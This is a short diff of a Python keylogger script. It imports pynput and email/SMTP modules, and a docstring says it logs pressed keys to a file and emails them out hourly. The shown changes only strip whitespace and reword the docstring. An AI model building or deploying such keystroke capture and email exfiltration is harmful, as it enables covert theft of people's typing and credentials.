@@ -1,9 +1,9 @@
 import smtplib
 import time
 from pynput import keyboard
-from email.mime.text import MIMEText 
-from email.mime.application import MIMEApplication 
-from email.mime.multipart import MIMEMultipart 
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+from email.mime.multipart import MIMEMultipart
 import os 
 
 class Keylogger:
@@ -17,7 +17,7 @@ class Keylogger:
     def keyPressed(self, key):
         '''
         Tracks the keys pressed and writes them onto a text file
-        It also keeps track of the time elapsed and sends an email if work has been done within the last hour
+        It keeps track of the time elapsed and sends an email if work has been done within the last hour
         '''
 
         # Makes the variable "current" global so it can be seen outside the function
